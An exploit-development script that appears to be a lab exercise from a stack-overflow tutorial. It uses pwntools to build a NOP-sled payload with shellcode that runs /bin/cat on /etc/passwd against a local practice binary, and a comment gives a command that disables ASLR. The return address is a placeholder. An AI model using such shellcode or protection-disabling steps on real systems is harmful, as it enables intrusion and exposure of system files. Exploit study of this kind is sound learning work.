# ls *.py | entr bash -c 'date; python main.py'
# echo 0 > /proc/sys/kernel/randomize_va_space
# https://xakep.ru/2019/09/20/stack-overflow/

import subprocess

from pwn import *

TARGET = "./overflow"

context.terminal = ["tmuxpwnrestart"]


def s(cmd):
    for c in cmd.split(b"\n"):
        if c:
            subprocess.run(["tmuxpwnrestart", "SEND", base64.b64encode(c)])


context(
    # log_level=logging.DEBUG,
)
shellcode = (
    b"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
    b"\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
)

g = cyclic_gen()
print(len(shellcode))


if 1:
    payload = b""
    # payload = (136 * "A").encode() + p32(0xFFFFC204)
    payload += 36 * b"\x90"
    payload += shellcode
    payload += (100 - len(shellcode) - 18) * b"\x90"
    # payload += p32(0xFFFFC1F6)
    payload += p32(0xDEADC0DE)

print(
    hexdump(payload[:140], width=16, groupsize=16),
)

io = gdb.debug(TARGET)

open("./payload.txt", "wb").write(payload)

# payload = "echo hello AAA\n"
io.sendline(payload)
s(
    b"target exec "
    + TARGET.encode()
    + b"""
    b *0x0804847f
"""
    + b'r $(echo "'
    + b"A" * 136
    + p32(0xDEADC0DE)
    + payload
    + b'")'
    + b"""
x/64wx $esp-136
"""
)
# print(g.find(b"jaab"))
# io.interactive()
# io.recv()
